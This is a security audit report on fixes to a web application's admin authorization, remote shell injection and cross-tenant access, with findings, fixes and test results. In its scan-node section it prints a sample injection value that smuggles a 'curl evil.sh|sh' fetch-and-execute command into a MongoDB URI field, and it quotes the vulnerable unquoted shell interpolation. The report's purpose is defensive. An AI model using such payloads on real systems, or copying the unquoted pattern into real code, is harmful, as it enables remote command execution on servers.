# Security Remediation Audit — IDOR & Shell Injection

**Date:** 2026-09-02
**Branch:** `nextgen15`
**Scope:** Independent verification of the IDOR / shell-injection remediation pass

## Verdict

**Mostly complete — one genuine gap found and fixed.**

Every claim in the remediation summary was independently verified and held up.
However, the sweep missed one live shell-injection vector, which is fixed here.

---

## Claims verified as correct

### Authorization

| Claim | Result |
|---|---|
| `src/lib/requireAdmin.js` centralizes admin auth | Confirmed |
| All `/api/admin/*` routes use it | Confirmed — all 5 routes |
| `ADMIN_EMAIL` no longer grants route access | Confirmed |
| Email fallback removed from `auth.js` / `user/me` | Confirmed |
| Supporters route variable shadowing fixed | Confirmed |

All five admin routes call `requireAdmin()`:
`ai-usage/migrate-daily-limit`, `ai-usage/reset`, `seed-keys`, `supporters`, `supporters/codes`.

`ADMIN_EMAIL` now appears in only two places, both legitimate **provisioning**
(not authorization): the Google `signIn` callback and `auth/register`. Both
persist `role: 'admin'` to the database rather than granting access at
request time.

One thing worth calling out: `requireAdmin` depends on `session.user.id`, and
the session callback was deliberately stripped of `role`. I confirmed
`session.user.id` is still populated (`token.dbId || token.sub`), so the helper
cannot silently 401 every legitimate admin.

### Shell injection

The `_ssh.js` change is a genuinely good catch that most reviews miss:
`JSON.stringify()` is **not** shell-safe — it leaves `$`, backticks and `!`
intact, so a path containing `$(...)` would execute. Replaced with `shellQuote`.

The `restore-docker` rewrite is sound: container names are validated against
`^[a-zA-Z0-9][a-zA-Z0-9_.-]*$`, `docker run` arguments are built as a bash
array from NUL-delimited Python output, and `eval` is gone.

### Validation previously claimed — re-run

- ESLint on all changed files: **clean**
- Test suite: **83 passed / 0 failed**
- `git diff --check`: **clean**

---

## Gap found: shell injection via `/api/mongo-sync/scan-node`

**File:** `src/app/api/mongo-sync/scan-node/route.js`
**Severity:** High — authenticated remote command execution on the SSH target

The `verify` action parsed a host out of the **user-supplied** `mongoUri`
request-body field and interpolated it into a shell script executed over SSH
as a bare assignment:

```js
const match = (mongoUri || '').match(/\/\/([^:/]+):(\d+)/);
// ...
const script = `
PORT=${port}
HOST=${host || '127.0.0.1'}
```

`[^:/]+` excludes only `:` and `/` — it happily permits `;`, `$()`, backticks
and spaces. A crafted body value such as:

```
mongodb://x;curl evil.sh|sh;:27017
```

produced `HOST=x;curl evil.sh|sh;` and executed on the remote server.

This route was **not** in the modified-file list. The summary covered
"Mongo sync cron" but not this sibling route.

### Fix applied

Two layers, so the vulnerability does not return if either is refactored away:

1. **Call-site validation** — host restricted to `[a-zA-Z0-9._-]+`, port
   validated as an integer in `1..65535`.
2. **Interpolation-site quoting** — `PORT=${shellInt(port) ?? '0'}` and
   `HOST=${shellQuote(host || '127.0.0.1')}`.

Both call sites of `verifyPortViaSSH` are now covered, including the `scan`
action which passes the stored connection host.

No functional regression: IPv6-bracket and colon-containing hosts were already
unparseable by the original expression, so nothing that worked before is
broken now.

---

## Reviewed and deliberately left alone

- **`scan-node` `run-docker` action** — an intentional arbitrary-command
  feature. Safe because `ConnectionRepository.findById` scopes queries by
  `userId`, so users can only reach their own connections. Quoting it would
  break the feature.
- **`firewall/source/route.js`** — defines its own local `shellQuote` that is
  functionally equivalent. Not a vulnerability, but it duplicates the new
  shared helper; worth consolidating.
- **`deploy/webhook` tmux session name** — sanitized via
  `projectId.replace(/[^a-zA-Z0-9_-]/g, '-')`. This is defence by sanitization
  rather than quoting, so it works today but is fragile if the assignment
  changes.

---

## Changes made in this audit

| File | Change |
|---|---|
| `src/app/api/mongo-sync/scan-node/route.js` | Host charset + port validation, quoted both script interpolations |
| `tests/scanNodeInjection.test.mjs` | New — 8 regression tests |

## Follow-up findings and hardening

A second ownership sweep found and fixed two additional cross-tenant paths:

| File | Finding | Resolution |
|---|---|---|
| `src/app/api/mongo-sync/cron/route.js` | A session-authenticated caller could supply another tenant's `connectionId`; the unscoped repository then embedded that tenant's MongoDB URI and credentials in a generated cron script. | Reject any owned connection whose `userId` differs from the session user. |
| `src/app/api/ssh/compat/route.js` | A diagnostic 403 response exposed the owner email of a connection ID belonging to another tenant. | Retain the useful 403/404 distinction but return no owner data. |
| `src/app/api/deploy/webhook/route.js` | A query-string project ID reached remote script paths and tmux commands; session-name sanitization alone was brittle. | Validate IDs once at request entry (`[a-zA-Z0-9_-]{1,60}`), reject invalid values with 400. |

The local `shellQuote` duplicate in `firewall/source` was also consolidated
onto the shared helper.

## Admin recovery status

The local database contained **15 users and 0 users with `role: 'admin'`**;
`ADMIN_EMAIL` was not configured. This would lock every account out of
`/api/admin/*` after the persisted-role authorization change. Added:

```bash
node scripts/set-admin-role.js --list
node scripts/set-admin-role.js --email <your-admin-email>
node scripts/set-admin-role.js --email <your-admin-email> --revoke
```

The script was tested with a grant/revoke round-trip and the database was
returned to its original no-admin state. An operator must explicitly grant an
admin role before relying on the admin routes.

## Final validation

- Test suite: **96 passed / 0 failed**
- ESLint on every changed source file: **clean**
- `git diff --check`: **clean**

## Commits created

1. `b6fc56b` — persisted database-role admin authorization
2. `9c560ec` — public authentication endpoint rate limits
3. `1859b39` — remote shell quoting and Docker restore hardening
4. `d887d0c` — cross-tenant isolation fixes and regression coverage
